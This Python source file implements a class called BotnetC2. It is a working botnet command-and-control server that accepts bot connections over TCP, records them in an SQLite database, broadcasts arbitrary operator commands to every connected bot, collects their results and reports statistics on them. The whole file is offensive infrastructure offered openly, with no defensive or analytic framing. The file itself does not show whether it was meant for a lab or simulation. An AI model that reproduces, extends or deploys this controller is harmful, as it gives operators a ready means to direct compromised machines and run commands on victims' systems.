import socket
import threading
import time
import sqlite3
import json
from datetime import datetime
from src.utils import add_system_log

class BotnetC2:
    def __init__(self, host='0.0.0.0', port=6667, db_path='c2_database.db'):
        self.host = host
        self.port = port
        self.db_path = db_path
        self.bots = {}  # Active connections
        self.commands = []
        self.logs = []
        self.running = False
        self.db_lock = threading.Lock()

        # Initialize database
        self.init_database()
        self.load_persistent_bots()

    def init_database(self):
        """Initialize SQLite database for persistent storage"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # Create bots table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bots (
                    id TEXT PRIMARY KEY,
                    ip TEXT NOT NULL,
                    port INTEGER,
                    first_seen TEXT,
                    last_seen TEXT,
                    status TEXT DEFAULT 'offline',
                    metadata TEXT,
                    total_commands INTEGER DEFAULT 0,
                    successful_commands INTEGER DEFAULT 0
                )
            ''')

            # Create commands table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    command TEXT NOT NULL,
                    timestamp TEXT,
                    executed_by TEXT,
                    status TEXT DEFAULT 'pending'
                )
            ''')

            # Create command_results table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS command_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    command_id INTEGER,
                    bot_id TEXT,
                    result TEXT,
                    timestamp TEXT,
                    FOREIGN KEY (command_id) REFERENCES commands (id),
                    FOREIGN KEY (bot_id) REFERENCES bots (id)
                )
            ''')

            # Create statistics table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS statistics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    metric TEXT UNIQUE,
                    value TEXT,
                    updated_at TEXT
                )
            ''')

            conn.commit()
            conn.close()

    def load_persistent_bots(self):
        """Load previously registered bots from database"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT id, ip, port, metadata FROM bots WHERE status = 'persistent'")
            bots = cursor.fetchall()
            conn.close()

            for bot_id, ip, port, metadata in bots:
                self.log(f"📚 Loaded persistent bot: {bot_id}")
                # Note: These are offline bots, will be marked online when they reconnect

    def save_bot(self, bot_id, ip, port, metadata=None):
        """Save or update bot in database"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            now = datetime.now().isoformat()
            metadata_json = json.dumps(metadata) if metadata else '{}'

            cursor.execute('''
                INSERT OR REPLACE INTO bots (id, ip, port, first_seen, last_seen, status, metadata)
                VALUES (?, ?, ?, ?, ?, 'online', ?)
            ''', (bot_id, ip, port, now, now, metadata_json))

            conn.commit()
            conn.close()

    def update_bot_status(self, bot_id, status):
        """Update bot status in database"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            now = datetime.now().isoformat()
            cursor.execute('''
                UPDATE bots SET status = ?, last_seen = ? WHERE id = ?
            ''', (status, now, bot_id))

            conn.commit()
            conn.close()

    def save_command(self, command, executed_by='system'):
        """Save command to database"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            now = datetime.now().isoformat()
            cursor.execute('''
                INSERT INTO commands (command, timestamp, executed_by)
                VALUES (?, ?, ?)
            ''', (command, now, executed_by))

            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return command_id

    def save_command_result(self, command_id, bot_id, result):
        """Save command execution result"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            now = datetime.now().isoformat()
            cursor.execute('''
                INSERT INTO command_results (command_id, bot_id, result, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (command_id, bot_id, result, now))

            # Update bot statistics
            cursor.execute('''
                UPDATE bots SET total_commands = total_commands + 1,
                               successful_commands = successful_commands + 1
                WHERE id = ?
            ''', (bot_id,))

            conn.commit()
            conn.close()

    def get_bot_stats(self):
        """Get comprehensive bot statistics"""
        with self.db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # Total bots ever registered
            cursor.execute("SELECT COUNT(*) FROM bots")
            total_bots = cursor.fetchone()[0]

            # Active bots
            cursor.execute("SELECT COUNT(*) FROM bots WHERE status = 'online'")
            active_bots = cursor.fetchone()[0]

            # Commands executed
            cursor.execute("SELECT COUNT(*) FROM commands")
            total_commands = cursor.fetchone()[0]

            # Successful commands
            cursor.execute("SELECT SUM(successful_commands) FROM bots")
            successful_commands = cursor.fetchone()[0] or 0

            conn.close()

            return {
                'total_bots': total_bots,
                'active_bots': active_bots,
                'total_commands': total_commands,
                'successful_commands': successful_commands,
                'success_rate': (successful_commands / max(total_commands, 1)) * 100
            }

    def log(self, message):
        add_system_log(f"[bold yellow]C2:[/] {message}")

    def broadcast(self, message):
        dead_ids = []
        for bot_id, client in self.bots.items():
            try:
                client.send(message.encode() + b"\n")
            except:
                dead_ids.append(bot_id)
        for dead_id in dead_ids:
            if dead_id in self.bots:
                del self.bots[dead_id]
        if dead_ids:
            self.log(f"Removed {len(dead_ids)} disconnected bots")

    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        self.running = True
        self.log(f"🟢 C2 server started on {self.port}")
        while self.running:
            try:
                server.settimeout(1.0)
                try:
                    client, addr = server.accept()
                except socket.timeout:
                    continue
                bot_id = f"{addr[0]}:{addr[1]}"
                self.bots[bot_id] = client

                # Save bot to database
                self.save_bot(bot_id, addr[0], addr[1], {
                    'user_agent': 'unknown',
                    'connection_time': datetime.now().isoformat()
                })

                self.log(f"🤖 Bot connected: {bot_id}")
                threading.Thread(target=self.handle_bot, args=(client, bot_id), daemon=True).start()
            except Exception as e:
                if self.running:
                    self.log(f"❌ Server Error: {e}")
                break
        server.close()
        self.running = False
        self.log("🔴 C2 server stopped")

    def handle_bot(self, client, bot_id):
        while self.running:
            try:
                client.settimeout(1.0)
                try:
                    data = client.recv(1024)
                except socket.timeout:
                    continue
                if not data:
                    break
                command = data.decode().strip()
                if command.startswith("RESULT:"):
                    result = command[7:]
                    self.log(f"📩 [{bot_id}] {result}")

                    # Save command result to database
                    # Note: In a real implementation, you'd track command IDs
                    self.save_command_result(0, bot_id, result)

                elif command == "PING":
                    client.send(b"PONG\n")
                elif command.startswith("REGISTER:"):
                    # Bot registration with metadata
                    try:
                        metadata = json.loads(command[9:])
                        self.save_bot(bot_id, *bot_id.split(':'), metadata)
                        client.send(b"REGISTERED\n")
                    except:
                        client.send(b"ERROR: Invalid registration\n")
            except:
                break

        # Mark bot as offline in database
        self.update_bot_status(bot_id, 'offline')

        if bot_id in self.bots:
            del self.bots[bot_id]
        client.close()
        self.log(f"🔌 Bot disconnected: {bot_id}")

    def send_command(self, command, save_to_db=True):
        # Save command to database
        if save_to_db:
            command_id = self.save_command(command)
        else:
            command_id = None

        sent_count = 0
        for bot_id, client in self.bots.items():
            try:
                client.send(f"{command}\n".encode())
                sent_count += 1
            except:
                pass

        self.log(f"📤 Command sent to {sent_count} bots: {command}")
        return sent_count

    def get_status(self):
        """Get comprehensive C2 server status"""
        stats = self.get_bot_stats()
        return {
            'running': self.running,
            'host': self.host,
            'port': self.port,
            'active_connections': len(self.bots),
            'total_bots_ever': stats['total_bots'],
            'total_commands': stats['total_commands'],
            'success_rate': stats['success_rate'],
            'active_bots': list(self.bots.keys())
        }

    def show_stats(self):
        """Display comprehensive statistics"""
        stats = self.get_status()
        status = self.get_bot_stats()

        self.log("📊 C2 Server Statistics:")
        self.log(f"   Active Connections: {stats['active_connections']}")
        self.log(f"   Total Bots Ever: {status['total_bots']}")
        self.log(f"   Total Commands: {status['total_commands']}")
        self.log(f"   Success Rate: {status['success_rate']:.1f}%")

        if stats['active_bots']:
            self.log("   Active Bots:")
            for bot in stats['active_bots']:
                self.log(f"     - {bot}")
